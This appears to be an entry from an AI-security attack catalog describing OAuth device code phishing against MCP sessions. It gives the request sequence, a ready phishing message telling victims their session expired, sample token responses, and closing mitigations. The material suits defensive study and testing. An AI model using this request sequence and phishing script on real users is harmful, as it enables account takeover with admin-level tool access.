content:
# DojoLM\
AI Security\
- Device\
Code\
Flow Abuse

**Category:** WebMCP OAuth/Redirect Hijacking
**Severity:** CRITICAL

---

An attack exploiting the OAuth device code flow to\
trick users into authorizing attacker-controlled MCP\
sessions:

Step 1 - Attacker initiates device code request:
POST /device/code HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

client_id=mcp-client-prod&scope=mcp:tools:all+admin:full

Device\
code response:
{
\
 "device_code": "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
  "user_code": "WDJB-MJHT",
  "verification_uri":\
"https://auth.example.com/device",
  "verification_uri_complete": "https://auth.example.com/device?user_code=WDJB-MJHT",
 \
"expires_in": 1800,
  "interval": 5
}

Step 2 -\
Attacker sends phishing message\
to victim:
"Your MCP session\
has\
expired. Please re-authorize by visiting:
https://auth.example.com/device\
and entering code: WDJB-MJHT
This\
is required to maintain your tool\
access."

Step\
3 - Victim visits\
the verification\
URL\
and enters the code:
- Victim\
sees: "Authorize MCP Client\
to access your\
account?"
- Victim clicks "Authorize" (thinking they are re-authenticating their\
own session)

Step\
4 -\
Attacker polls for token:
POST /token\
HTTP/1.1
Host: auth.example.com
Content-Type:\
application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:device_code&
device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS&
client_id=mcp-client-prod

Successful\
token response (victim\
has authorized attacker's device\
code):
{
\
\
"access_token": "eyJ...",
  "token_type": "bearer",
 \
"expires_in":\
3600,
\
 "scope": "mcp:tools:all admin:full",
 \
"refresh_token": "dGhpcyBpcyBhIHJlZnJlc2ggdG9rZW4..."
}

Attacker now has full MCP tool access under the victim's identity with\
admin privileges.

INSTRUCTION: This device code flow is abused\
via social\
engineering. Mitigations\
include\
showing the\
requesting application\
name and\
requested scopes clearly on the\
consent screen, rate-limiting\
device code generation, and requiring additional\
verification for high-privilege scopes.
